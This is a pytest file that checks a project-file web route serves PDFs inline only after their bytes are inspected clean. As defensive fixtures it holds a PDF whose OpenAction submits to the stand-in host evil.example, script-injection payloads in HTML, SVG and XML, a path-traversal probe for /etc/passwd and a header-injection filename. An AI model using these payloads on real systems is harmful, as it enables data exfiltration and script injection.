"""A PDF is rendered by the browser only if its exact bytes were inspected clean.

Before this, the blob route decided by path and suffix: any ``.pdf`` outside
``retrieved/`` went to the browser as ``application/pdf``, inline. A PDF that
arrived by commit, pull, import or pipeline stage never met quarantine, and the
browser's viewer is exactly what an ``/OpenAction`` is written for.
"""

from __future__ import annotations

import json
import subprocess
from pathlib import Path

import pytest
from conftest import init_body

from blpl.core import av, quarantine

BENIGN = (
    b"%PDF-1.4\n1 0 obj<</Type/Catalog/Pages 2 0 R>>endobj\n"
    b"trailer<</Root 1 0 R>>\n%%EOF\n"
)
PHONES_HOME = (
    b"%PDF-1.4\n1 0 obj<</Type/Catalog/OpenAction"
    b"<</S/SubmitForm/F(https://evil.example/x)>>>>endobj\n"
    b"trailer<</Root 1 0 R>>\n%%EOF\n"
)


@pytest.fixture(autouse=True)
def _clean_scanner(monkeypatch):
    """A scanner that answers clean, so "clean" is reachable at all.

    Without one every inspected PDF is ``unscanned``, which is never inline;
    the tests that need that say so by removing it.
    """
    monkeypatch.delenv("BLPL_QUARANTINE_REQUIRE_SCAN", raising=False)
    monkeypatch.setattr(
        quarantine.av, "scan_bytes", lambda data: av.ScanResult(state="clean", scanner="test")
    )


def _project(client, name="scratch"):
    import app.main as main

    client.post("/api/projects/init", json=init_body(name))
    return main.PROJECTS_ROOT / name


def _commit(proj, rel, data):
    """Put a file in the project the way a pull or a member's commit does."""
    target = proj / rel
    target.parent.mkdir(parents=True, exist_ok=True)
    target.write_bytes(data)
    env = {"GIT_AUTHOR_NAME": "x", "GIT_AUTHOR_EMAIL": "x@example.com",
           "GIT_COMMITTER_NAME": "x", "GIT_COMMITTER_EMAIL": "x@example.com"}
    import os

    subprocess.run(["git", "add", rel], cwd=proj, check=True)
    subprocess.run(["git", "commit", "-qm", "add"], cwd=proj, check=True, env={**os.environ, **env})


def _blob(client, path, name="scratch"):
    return client.get(f"/api/projects/{name}/blob", params={"path": path})


def _inline(r) -> bool:
    return (
        r.headers["content-type"] == "application/pdf"
        and r.headers["content-disposition"].startswith("inline")
    )


def _opaque(r) -> bool:
    return (
        r.headers["content-type"] == "application/octet-stream"
        and r.headers["content-disposition"].startswith("attachment")
        and r.headers["x-content-type-options"] == "nosniff"
        and "sandbox" in r.headers.get("content-security-policy", "")
    )


def test_an_uninspected_pdf_committed_into_a_project_is_not_served_inline(unlocked):
    proj = _project(unlocked)
    _commit(proj, "datasheets/TPS62840.pdf", BENIGN)
    r = _blob(unlocked, "datasheets/TPS62840.pdf")
    assert r.status_code == 200
    assert _opaque(r) and not _inline(r)
    assert r.headers["x-blpl-pdf-verdict"] == "none"
    # Still the file: a download, not a refusal.
    assert r.content == BENIGN


def test_after_inspection_it_is(unlocked):
    proj = _project(unlocked)
    _commit(proj, "datasheets/TPS62840.pdf", BENIGN)
    before = unlocked.get("/api/projects/scratch/blob/verdict", params={"path": "datasheets/TPS62840.pdf"}).json()
    assert before["pdf"] is True and before["verdict"] is None and before["inline"] is False

    r = unlocked.post("/api/projects/scratch/blob/inspect", json={"path": "datasheets/TPS62840.pdf"})
    assert r.status_code == 200, r.text
    assert r.json()["verdict"] == "clean" and r.json()["inline"] is True

    served = _blob(unlocked, "datasheets/TPS62840.pdf")
    assert _inline(served)
    assert served.content == BENIGN


def test_a_held_pdf_is_never_inline(unlocked):
    proj = _project(unlocked)
    _commit(proj, "evil.pdf", PHONES_HOME)
    r = unlocked.post("/api/projects/scratch/blob/inspect", json={"path": "evil.pdf"})
    body = r.json()
    assert body["verdict"] == "held" and body["inline"] is False
    assert any("OpenAction" in reason or "open" in reason for reason in body["reasons"]), body["reasons"]
    served = _blob(unlocked, "evil.pdf")
    assert _opaque(served)
    assert served.headers["x-blpl-pdf-verdict"] == "held"


def test_content_changed_after_inspection_is_not_inline(unlocked):
    """The verdict belongs to the bytes. New bytes at the same path have none."""
    proj = _project(unlocked)
    _commit(proj, "datasheets/X.pdf", BENIGN)
    unlocked.post("/api/projects/scratch/blob/inspect", json={"path": "datasheets/X.pdf"})
    assert _inline(_blob(unlocked, "datasheets/X.pdf"))

    (proj / "datasheets/X.pdf").write_bytes(PHONES_HOME)
    r = _blob(unlocked, "datasheets/X.pdf")
    assert _opaque(r)
    assert r.headers["x-blpl-pdf-verdict"] == "none"


def test_a_renamed_or_copied_clean_pdf_keeps_its_verdict(unlocked):
    """The other side of trusting bytes: moving a file sheds nothing."""
    proj = _project(unlocked)
    _commit(proj, "a.pdf", BENIGN)
    unlocked.post("/api/projects/scratch/blob/inspect", json={"path": "a.pdf"})
    (proj / "boards").mkdir()
    (proj / "boards" / "copy.pdf").write_bytes(BENIGN)
    assert _inline(_blob(unlocked, "boards/copy.pdf"))


def test_a_pdf_is_recognised_by_its_bytes_not_its_name(unlocked):
    proj = _project(unlocked)
    _commit(proj, "notes.txt", b"\n" + PHONES_HOME)
    r = _blob(unlocked, "notes.txt")
    assert _opaque(r)
    # And a file only *named* .pdf is not handed to the viewer either.
    _commit(proj, "fake.pdf", b"<html><script>alert(1)</script></html>")
    fake = _blob(unlocked, "fake.pdf")
    assert fake.headers["content-type"] == "application/octet-stream"
    assert fake.headers["content-disposition"].startswith("attachment")


def test_an_unscanned_pdf_is_not_clean_enough_to_render(unlocked, monkeypatch):
    monkeypatch.setattr(
        quarantine.av, "scan_bytes", lambda data: av.ScanResult(state="unscanned", detail="none")
    )
    proj = _project(unlocked)
    _commit(proj, "a.pdf", BENIGN)
    body = unlocked.post("/api/projects/scratch/blob/inspect", json={"path": "a.pdf"}).json()
    assert body["verdict"] == "unscanned" and body["inline"] is False
    assert _opaque(_blob(unlocked, "a.pdf"))


def test_a_clean_verdict_from_another_inspector_does_not_count(unlocked):
    import app.db
    from app.models import PdfVerdict

    proj = _project(unlocked)
    _commit(proj, "a.pdf", BENIGN)
    unlocked.post("/api/projects/scratch/blob/inspect", json={"path": "a.pdf"})
    with app.db.SessionFactory() as s:
        row = s.query(PdfVerdict).one()
        row.inspector = "pdf_inspect/0"
        s.commit()
    assert _opaque(_blob(unlocked, "a.pdf"))


def test_a_ledger_row_saying_released_is_not_taken_on_its_word(unlocked):
    """The ledger is committed, so a pull can bring in any claim."""
    import json

    proj = _project(unlocked)
    import hashlib

    sha = hashlib.sha256(PHONES_HOME).hexdigest()
    ledger = quarantine.quarantine_dir(proj) / quarantine.LEDGER_NAME
    ledger.parent.mkdir(parents=True, exist_ok=True)
    ledger.write_text(json.dumps({"schema_version": 1, "retrieved": [{
        "sha256": sha, "filename": "x.pdf", "bytes": 1, "state": "released",
        "inspector": quarantine.INSPECTOR,
        "inspection": {"state": "inspected"}, "scan": {"state": "clean"}, "reasons": [],
    }]}))
    _commit(proj, "datasheets/forged.pdf", PHONES_HOME)
    assert _opaque(_blob(unlocked, "datasheets/forged.pdf"))


def test_a_ledger_row_saying_held_is_shown_before_any_download(unlocked):
    import hashlib
    import json

    proj = _project(unlocked)
    sha = hashlib.sha256(BENIGN).hexdigest()
    ledger = quarantine.quarantine_dir(proj) / quarantine.LEDGER_NAME
    ledger.parent.mkdir(parents=True, exist_ok=True)
    ledger.write_text(json.dumps({"schema_version": 1, "retrieved": [{
        "sha256": sha, "filename": "x.pdf", "bytes": 1, "state": "held",
        "inspection": {"state": "inspected"}, "scan": {"state": "infected"},
        "reasons": ["a malware scanner matched Test"],
    }]}))
    _commit(proj, "copied.pdf", BENIGN)
    v = unlocked.get("/api/projects/scratch/blob/verdict", params={"path": "copied.pdf"}).json()
    assert v["verdict"] == "held" and v["reasons"] == ["a malware scanner matched Test"]
    assert v["source"] == "ledger"
    assert _opaque(_blob(unlocked, "copied.pdf"))


def test_an_upload_records_its_verdict_so_a_clean_one_opens(unlocked):
    _project(unlocked)
    import json

    r = unlocked.post(
        "/api/projects/scratch/uploads",
        files=[("files", ("guide.pdf", BENIGN, "application/pdf"))],
        data={"meta": json.dumps([{"kind": "reference"}])},
    )
    path = r.json()["results"][0]["path"]
    assert _inline(_blob(unlocked, path))


def test_a_retrieved_file_stays_a_download_even_when_clean(unlocked):
    proj = _project(unlocked)
    qdir = quarantine.quarantine_dir(proj)
    qdir.mkdir(parents=True, exist_ok=True)
    (qdir / "abc-X.pdf").write_bytes(BENIGN)
    unlocked.post("/api/projects/scratch/blob/inspect", json={"path": "retrieved/abc-X.pdf"})
    r = _blob(unlocked, "retrieved/abc-X.pdf")
    assert r.headers["content-type"] == "application/octet-stream"
    v = unlocked.get("/api/projects/scratch/blob/verdict", params={"path": "retrieved/abc-X.pdf"}).json()
    assert v["inline"] is False


def test_a_pdf_over_the_limit_is_never_judged_or_inline(unlocked, monkeypatch):
    import app.main as main

    proj = _project(unlocked)
    _commit(proj, "big.pdf", BENIGN)
    monkeypatch.setattr(main, "UPLOAD_MAX_BYTES", 16)
    assert _opaque(_blob(unlocked, "big.pdf"))
    assert unlocked.post("/api/projects/scratch/blob/inspect", json={"path": "big.pdf"}).status_code == 413


def test_only_pdfs_are_inspected(unlocked):
    proj = _project(unlocked)
    _commit(proj, "notes.md", b"# hi\n")
    assert unlocked.post("/api/projects/scratch/blob/inspect", json={"path": "notes.md"}).status_code == 400


def test_inspecting_does_not_reach_outside_the_project(unlocked):
    _project(unlocked)
    r = unlocked.post("/api/projects/scratch/blob/inspect", json={"path": "../../etc/passwd"})
    assert r.status_code in (400, 404)


def test_a_verdict_in_one_project_does_not_vouch_for_another(unlocked):
    a = _project(unlocked, "one")
    b = _project(unlocked, "two")
    _commit(a, "x.pdf", BENIGN)
    _commit(b, "x.pdf", BENIGN)
    unlocked.post("/api/projects/one/blob/inspect", json={"path": "x.pdf"})
    assert _inline(_blob(unlocked, "x.pdf", "one"))
    assert _opaque(_blob(unlocked, "x.pdf", "two"))


@pytest.mark.parametrize("name,data", [
    ("page.html", b"<script>fetch('/api/projects')</script>"),
    ("logo.svg", b"<svg xmlns='http://www.w3.org/2000/svg'><script>alert(1)</script></svg>"),
    ("thing.xml", b"<?xml version='1.0'?><x:script xmlns:x='http://www.w3.org/1999/xhtml'>alert(1)</x:script>"),
    ("page.xhtml", b"<html xmlns='http://www.w3.org/1999/xhtml'><script>alert(1)</script></html>"),
])
def test_active_types_committed_into_a_project_are_inert_downloads(unlocked, name, data):
    proj = _project(unlocked)
    _commit(proj, name, data)
    r = _blob(unlocked, name)
    assert r.headers["content-type"] == "application/octet-stream"
    assert r.headers["content-disposition"].startswith("attachment")
    assert r.headers["x-content-type-options"] == "nosniff"
    assert "sandbox" in r.headers["content-security-policy"]


def test_text_and_images_still_display_but_cannot_run(unlocked):
    proj = _project(unlocked)
    _commit(proj, "notes.md", b"<script>alert(1)</script>\n")
    _commit(proj, "shot.png", b"<svg onload=alert(1)>")
    md = _blob(unlocked, "notes.md")
    assert md.headers["content-type"].startswith("text/plain")
    assert "sandbox" in md.headers["content-security-policy"]
    png = _blob(unlocked, "shot.png")
    assert png.headers["content-type"] == "image/png"
    assert png.headers["x-content-type-options"] == "nosniff"


def test_a_filename_cannot_inject_a_header(unlocked):
    proj = _project(unlocked)
    (proj / 'a"b.md').write_bytes(b"x")
    r = _blob(unlocked, 'a"b.md')
    assert r.status_code == 200
    assert r.headers["content-disposition"] == "inline; filename*=utf-8''a%22b.md"


def test_a_chat_attachment_pdf_follows_the_same_rule(unlocked, monkeypatch):
    _project(unlocked)
    conv = unlocked.post("/api/projects/scratch/conversations", json={"title": "t"}).json()["filename"]
    att = unlocked.post(
        f"/api/projects/scratch/conversations/{conv}/attachments",
        files=[("files", ("a.pdf", BENIGN, "application/pdf"))],
    ).json()[0]
    r = unlocked.get(f"/api/projects/scratch/attachments/{att['id']}")
    assert _inline(r)

    # Attached where no scanner ran: kept for the model, but not rendered.
    monkeypatch.setattr(
        quarantine.av, "scan_bytes", lambda data: av.ScanResult(state="unscanned", detail="none")
    )
    other = BENIGN + b"%other\n"
    att2 = unlocked.post(
        f"/api/projects/scratch/conversations/{conv}/attachments",
        files=[("files", ("b.pdf", other, "application/pdf"))],
    ).json()[0]
    r2 = unlocked.get(f"/api/projects/scratch/attachments/{att2['id']}")
    assert _opaque(r2)
    assert r2.content == other


def test_every_api_response_says_nosniff(unlocked):
    _project(unlocked)
    r = unlocked.get("/api/projects/scratch/tree")
    assert r.headers["x-content-type-options"] == "nosniff"


# -- a datasheet the agent fetches is recorded as it is inspected ---------------

from test_chat_api import (  # noqa: E402  (shared chat-turn scaffolding)
    _drain,
    _new_conversation,
    _ready,
    _script,
    chat_client,  # noqa: F401  (fixture)
)


def _fake_distributor(monkeypatch, tmp_path, data: bytes):
    """One configured distributor whose script "downloads" ``data``."""
    from blpl.agent import kicad_happy
    from blpl.agent.tools import parts

    script = tmp_path / "fetch_datasheet_digikey.py"
    script.write_text("# stands in for kicad-happy\n")
    monkeypatch.setattr(parts, "DISTRIBUTORS", ("digikey",))
    monkeypatch.setattr(parts, "script_path", lambda dist, name: script)
    monkeypatch.setattr(kicad_happy.CredResolver, "missing_for", lambda self, dist: [])

    def run_script(path, args, **kw):
        out = Path(args[args.index("-o") + 1])
        out.write_bytes(data)
        return kicad_happy.ScriptResult(
            ok=True, exit_code=0, data={"datasheet_url": "https://example.com/x.pdf"},
            stdout="", stderr="",
        )

    monkeypatch.setattr(parts, "run_script", run_script)


def _agent_fetches(chat_client, monkeypatch, mpn: str) -> str:
    from blpl.core.llm_chat import Done, Msg, ToolCall, ToolUseBlock

    call = ToolUseBlock(id="f1", name="fetch_datasheet", input={"mpn": mpn})
    _script(monkeypatch, [
        [ToolCall(id=call.id, name=call.name, input=call.input), Done("tool_use", Msg(role="assistant", content=[call]))],
        [Done("end_turn", Msg.assistant("fetched"))],
    ])
    _ready(chat_client)
    filename = _new_conversation(chat_client)
    started = chat_client.post(f"/api/projects/scratch/conversations/{filename}/chat", json={"content": "go"})
    _drain(chat_client, started.json()["turn_id"])
    import app.main as main

    proj = main.PROJECTS_ROOT / "scratch"
    found = sorted(p.relative_to(proj).as_posix() for p in (proj / "datasheets").rglob("*.pdf"))
    assert len(found) == 1, found
    return found[0]


def test_a_datasheet_the_agent_fetches_opens_without_a_click(chat_client, monkeypatch, tmp_path):
    _fake_distributor(monkeypatch, tmp_path, BENIGN)
    rel = _agent_fetches(chat_client, monkeypatch, "TPS62840")
    r = _blob(chat_client, rel)
    assert _inline(r), (r.headers, rel)
    v = chat_client.get("/api/projects/scratch/blob/verdict", params={"path": rel}).json()
    assert v["source"] == "fetch" and v["verdict"] == "clean"


def test_one_no_scanner_looked_at_still_downloads(chat_client, monkeypatch, tmp_path):
    monkeypatch.setattr(
        quarantine.av, "scan_bytes", lambda data: av.ScanResult(state="unscanned", detail="none")
    )
    _fake_distributor(monkeypatch, tmp_path, BENIGN)
    rel = _agent_fetches(chat_client, monkeypatch, "TPS62840")
    r = _blob(chat_client, rel)
    assert _opaque(r)
    assert r.headers["x-blpl-pdf-verdict"] == "unscanned"


# -- what the route holds in memory ----------------------------------------------


class _ReadSpy:
    """Wraps every file object os.fdopen hands out and records each read size."""

    def __init__(self, monkeypatch):
        import os as _os

        self.sizes: list[int] = []
        real = _os.fdopen
        spy = self

        class Recording:
            def __init__(self, fh):
                self._fh = fh

            def read(self, n=-1):
                spy.sizes.append(n)
                return self._fh.read(n)

            def __getattr__(self, name):
                return getattr(self._fh, name)

            def __enter__(self):
                return self

            def __exit__(self, *exc):
                self._fh.close()

        monkeypatch.setattr(_os, "fdopen", lambda fd, *a, **kw: Recording(real(fd, *a, **kw)))


def test_a_large_non_pdf_is_streamed_not_read_whole(unlocked, monkeypatch):
    """Codex, PR #21: every blob was read whole before it was classified, so a
    90 MB archive sat in memory twice over. Only a PDF has to be hashed."""
    proj = _project(unlocked)
    big = b"PK\x03\x04" + b"\x00" * (3 * 1024 * 1024)
    (proj / "gerbers.zip").write_bytes(big)
    spy = _ReadSpy(monkeypatch)
    r = _blob(unlocked, "gerbers.zip")
    assert r.status_code == 200 and r.content == big
    assert spy.sizes, "the route no longer reads through os.fdopen; this test measures nothing"
    assert all(0 < n <= 1024 * 1024 for n in spy.sizes), spy.sizes


def test_a_large_pdf_is_hashed_in_pieces_too(unlocked, monkeypatch):
    proj = _project(unlocked)
    big = BENIGN + b"%" + b"x" * (3 * 1024 * 1024) + b"\n"
    _commit(proj, "big.pdf", big)
    spy = _ReadSpy(monkeypatch)
    r = _blob(unlocked, "big.pdf")
    assert r.content == big and _opaque(r)
    assert all(0 < n <= 1024 * 1024 for n in spy.sizes), spy.sizes


def test_bytes_changed_in_place_after_judging_are_not_what_is_sent(unlocked, monkeypatch):
    """The verdict is for the bytes that were hashed; those are the bytes sent,
    even if the file is rewritten in place between the lookup and the send."""
    import app.main as main

    proj = _project(unlocked)
    _commit(proj, "a.pdf", BENIGN)
    unlocked.post("/api/projects/scratch/blob/inspect", json={"path": "a.pdf"})

    real = main.pdf_verdicts.lookup
    swapped = PHONES_HOME[: len(BENIGN)].ljust(len(BENIGN), b" ")

    def lookup_then_overwrite(*a, **kw):
        row = real(*a, **kw)
        with open(proj / "a.pdf", "r+b") as fh:
            fh.write(swapped)
        return row

    monkeypatch.setattr(main.pdf_verdicts, "lookup", lookup_then_overwrite)
    r = _blob(unlocked, "a.pdf")
    assert _inline(r)
    assert r.content == BENIGN


# -- byte ranges -----------------------------------------------------------------
#
# Codex, PR #21: streaming ignored Range and always sent 200 from byte 0, so a
# PDF viewer seeking, or a resumed download, fetched the whole file again.


def _ranged(client, path, value, **extra):
    return client.get(
        "/api/projects/scratch/blob", params={"path": path}, headers={"Range": value, **extra}
    )


def _security_headers_kept(r, *, pdf_inline=False):
    assert r.headers["x-content-type-options"] == "nosniff"
    if not pdf_inline:
        assert "sandbox" in r.headers["content-security-policy"]


ZIP = b"PK\x03\x04" + bytes(range(256)) * 40


def test_a_range_of_a_non_pdf(unlocked):
    proj = _project(unlocked)
    (proj / "gerbers.zip").write_bytes(ZIP)
    r = _ranged(unlocked, "gerbers.zip", "bytes=10-19")
    assert r.status_code == 206
    assert r.content == ZIP[10:20]
    assert r.headers["content-range"] == f"bytes 10-19/{len(ZIP)}"
    assert r.headers["content-length"] == "10"
    assert r.headers["accept-ranges"] == "bytes"
    assert r.headers["content-disposition"].startswith("attachment")
    _security_headers_kept(r)


def test_an_open_ended_and_a_suffix_range(unlocked):
    proj = _project(unlocked)
    (proj / "gerbers.zip").write_bytes(ZIP)
    tail = _ranged(unlocked, "gerbers.zip", f"bytes={len(ZIP) - 5}-")
    assert tail.status_code == 206 and tail.content == ZIP[-5:]
    suffix = _ranged(unlocked, "gerbers.zip", "bytes=-7")
    assert suffix.status_code == 206 and suffix.content == ZIP[-7:]
    assert suffix.headers["content-range"] == f"bytes {len(ZIP) - 7}-{len(ZIP) - 1}/{len(ZIP)}"
    # Past the end is clamped, not refused.
    past = _ranged(unlocked, "gerbers.zip", f"bytes=0-{len(ZIP) * 2}")
    assert past.status_code == 206 and past.content == ZIP


def test_an_unsatisfiable_range_is_416_with_the_size(unlocked):
    proj = _project(unlocked)
    (proj / "gerbers.zip").write_bytes(ZIP)
    r = _ranged(unlocked, "gerbers.zip", f"bytes={len(ZIP)}-")
    assert r.status_code == 416
    assert r.headers["content-range"] == f"bytes */{len(ZIP)}"
    _security_headers_kept(r)


@pytest.mark.parametrize("value", ["bytes=5-2", "bytes=abc", "items=0-4", "bytes=0-1,4-5", "bytes="])
def test_a_malformed_or_multiple_range_gets_the_whole_file(unlocked, value):
    """Multipart byteranges are not offered: a whole 200 is always a correct answer."""
    proj = _project(unlocked)
    (proj / "gerbers.zip").write_bytes(ZIP)
    r = _ranged(unlocked, "gerbers.zip", value)
    assert r.status_code == 200 and r.content == ZIP
    assert r.headers["accept-ranges"] == "bytes"


def test_a_range_of_an_inspected_pdf_is_inline_and_carries_its_etag(unlocked):
    proj = _project(unlocked)
    _commit(proj, "a.pdf", BENIGN)
    unlocked.post("/api/projects/scratch/blob/inspect", json={"path": "a.pdf"})
    whole = _blob(unlocked, "a.pdf")
    assert _inline(whole) and whole.headers["accept-ranges"] == "bytes"
    r = _ranged(unlocked, "a.pdf", "bytes=0-7")
    assert r.status_code == 206 and r.content == BENIGN[:8]
    assert r.headers["content-type"] == "application/pdf"
    assert r.headers["content-disposition"].startswith("inline")
    _security_headers_kept(r, pdf_inline=True)

    # If-Range with the current validator honours the range; a stale one gets
    # the whole, current file.
    same = _ranged(unlocked, "a.pdf", "bytes=0-7", **{"If-Range": whole.headers["etag"]})
    assert same.status_code == 206
    stale = _ranged(unlocked, "a.pdf", "bytes=0-7", **{"If-Range": '"0000"'})
    assert stale.status_code == 200 and stale.content == BENIGN


def test_a_range_of_an_uninspected_pdf_is_still_an_attachment(unlocked):
    """The verdict is decided on the whole file before any range is cut from it."""
    proj = _project(unlocked)
    _commit(proj, "a.pdf", BENIGN)
    r = _ranged(unlocked, "a.pdf", "bytes=0-7")
    assert r.status_code == 206 and r.content == BENIGN[:8]
    assert _opaque(r)


def test_a_range_of_a_chat_attachment(unlocked):
    _project(unlocked)
    conv = unlocked.post("/api/projects/scratch/conversations", json={"title": "t"}).json()["filename"]
    att = unlocked.post(
        f"/api/projects/scratch/conversations/{conv}/attachments",
        files=[("files", ("a.pdf", BENIGN, "application/pdf"))],
    ).json()[0]
    r = unlocked.get(f"/api/projects/scratch/attachments/{att['id']}", headers={"Range": "bytes=-4"})
    assert r.status_code == 206 and r.content == BENIGN[-4:]
    assert r.headers["content-type"] == "application/pdf"


# -- a file that changes while it is being read ------------------------------------
#
# Codex, PR #21: the spool followed a growing file to EOF, past the limit, on
# temporary disk with no bound; and a file whose size changed between fstat and
# EOF could still be judged and rendered.


def _grow_on_read(monkeypatch, path, appends: list[bytes]):
    """Make every read of a file opened by os.fdopen append the next chunk to ``path``."""
    import os as _os

    real = _os.fdopen
    pending = list(appends)

    class Growing:
        def __init__(self, fh):
            self._fh = fh

        def read(self, n=-1):
            out = self._fh.read(n)
            if pending:
                with open(path, "ab") as g:
                    g.write(pending.pop(0))
            return out

        def __getattr__(self, name):
            return getattr(self._fh, name)

        def __enter__(self):
            return self

        def __exit__(self, *exc):
            self._fh.close()

    monkeypatch.setattr(_os, "fdopen", lambda fd, *a, **kw: Growing(real(fd, *a, **kw)))


def test_a_pdf_that_grows_past_the_limit_while_spooled_is_too_large(unlocked, monkeypatch):
    import app.main as main

    proj = _project(unlocked)
    _commit(proj, "grow.pdf", BENIGN)
    monkeypatch.setattr(main, "UPLOAD_MAX_BYTES", 4096)
    monkeypatch.setattr(main, "_CHUNK", 512)
    spooled: list[int] = []
    real_spool = main._spool_and_hash

    def counting(fh, *a, **kw):
        out = real_spool(fh, *a, **kw)
        spooled.append(out[2])
        return out

    monkeypatch.setattr(main, "_spool_and_hash", counting)
    _grow_on_read(monkeypatch, proj / "grow.pdf", [b"%" + b"x" * 1023 + b"\n"] * 12)
    r = _blob(unlocked, "grow.pdf")
    assert r.status_code == 200
    assert _opaque(r)
    assert r.headers["x-blpl-pdf-verdict"] == "too_large"
    assert spooled and max(spooled) <= 4096 + 1, spooled


def test_a_pdf_whose_size_changes_between_fstat_and_eof_is_never_inline(unlocked, monkeypatch):
    """Even when the bytes that were read have a clean verdict: the file the
    route measured is not the file it read, so nothing about it is settled."""
    proj = _project(unlocked)
    grown = BENIGN + b"%pad\n"
    _commit(proj, "a.pdf", grown)
    unlocked.post("/api/projects/scratch/blob/inspect", json={"path": "a.pdf"})
    assert _inline(_blob(unlocked, "a.pdf"))

    (proj / "a.pdf").write_bytes(BENIGN)
    _grow_on_read(monkeypatch, proj / "a.pdf", [b"%pad\n"])
    r = _blob(unlocked, "a.pdf")
    assert _opaque(r)
    assert r.headers["x-blpl-pdf-verdict"] == "changed"


def test_the_verdict_view_says_so_when_the_file_changes_while_hashed(unlocked, monkeypatch):
    proj = _project(unlocked)
    grown = BENIGN + b"%pad\n"
    _commit(proj, "a.pdf", grown)
    unlocked.post("/api/projects/scratch/blob/inspect", json={"path": "a.pdf"})
    (proj / "a.pdf").write_bytes(BENIGN)
    _grow_on_read(monkeypatch, proj / "a.pdf", [b"%pad\n"])
    v = unlocked.get("/api/projects/scratch/blob/verdict", params={"path": "a.pdf"}).json()
    assert v["inline"] is False and v["sha256"] is None and v["changed"] is True


def test_inspecting_a_file_that_changes_while_read_records_nothing(unlocked, monkeypatch):
    proj = _project(unlocked)
    _commit(proj, "a.pdf", BENIGN)
    _grow_on_read(monkeypatch, proj / "a.pdf", [b"%pad\n"])
    r = unlocked.post("/api/projects/scratch/blob/inspect", json={"path": "a.pdf"})
    assert r.status_code == 409
    import app.db
    from app.models import PdfVerdict

    with app.db.SessionFactory() as s:
        assert s.query(PdfVerdict).count() == 0
